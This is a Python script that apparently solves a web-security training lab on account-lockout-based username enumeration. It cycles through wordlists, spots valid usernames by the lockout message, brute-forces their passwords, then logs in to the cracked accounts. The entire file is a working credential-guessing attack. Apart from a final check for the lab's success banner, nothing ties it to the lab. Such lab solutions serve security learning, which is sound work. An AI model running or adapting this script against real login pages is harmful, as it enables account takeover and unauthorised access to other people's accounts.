import requests
import sys
import urllib3
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


INVALID_USERNAME_RESPONSE = "Invalid username or password."
VALID_USERNAME_RESPONSE = "You have made too many incorrect login attempts."

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})
    return csrf.get('value', '') if csrf else '' # type: ignore

def login_acc(s, url, path, csrf_path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, csrf_path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')

def bruteforce_username_based_on_response(s, url, path, list_usernames):
    target_url = url + path
    valid_username = []
    for username in list_usernames:
        print(f'Try: username = {username}')
        for _ in range(5):
            payload = {
                'username': username,
                'password': 'test'
            }
            r = s.post(target_url, data=payload)
            
            if VALID_USERNAME_RESPONSE in r.text:
                valid_username.append(username)
    return valid_username

def bruteforce_password_based_on_response(s, url, path, list_passwords, valid_username):
    target_url = url + path
    valid_account = []
    for valid_username in valid_username:
        for password in list_passwords:
            print(f'Try: password = {password}')
            for _ in range(5):
                payload = {
                    'username': valid_username,
                    'password': password
                }
                r = s.post(target_url, data=payload)
                
                if INVALID_USERNAME_RESPONSE not in r.text and VALID_USERNAME_RESPONSE not in r.text:
                    valid_account.append((valid_username, password))
    return valid_account

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    list_usernames = open('./../common_username.txt', 'r', encoding='utf-8').read().strip().split('\n')
    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

    valid_usernames = bruteforce_username_based_on_response(s, url, '/login', list_usernames)
    valid_usernames = list(set(valid_usernames))
    print('List valid usernames: ', valid_usernames)
    valid_account = bruteforce_password_based_on_response(s, url, '/login', list_passwords, valid_usernames)
    print('List valid credentials: ', valid_account)

    print("[*] Wait 1 min until login account is unlock")
    time.sleep(60)
    print("Start login to valid accounts")
    for username, password in valid_account:
        login_acc(s, url, '/login', '/login', username, password)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()